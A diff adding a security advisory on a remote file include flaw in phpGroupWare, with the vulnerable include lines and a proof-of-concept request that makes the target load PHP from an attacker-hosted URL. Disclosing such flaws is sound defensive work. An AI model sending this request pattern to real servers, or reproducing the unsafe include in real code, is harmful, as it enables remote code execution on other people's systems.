@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/12074/info
+
+phpGroupWare is prone to a remote file include vulnerability, potentially allowing the execution of malicious PHP code. This would occur in the context of the affected web server. 
+
+The tables_update.inc.php script contains the following include calls:
+/* Include older phpGroupWare update support */
+include($appdir . 'tables_update_0_9_9.inc.php');
+include($appdir . 'tables_update_0_9_10.inc.php');
+include($appdir . 'tables_update_0_9_12.inc.php');
+
+For example supplying the following file:
+tables_update_0_9_9.inc.php = <?php print "<?php phpinfo();?>" ;?>
+
+The following request will execute the phpinfo() command on the vulnerable target:
+
+http://[victim]/[phpgroupware_directory]/phpgwapi/setup/tables_update.inc.php?appdir=http://[attacker]/
+
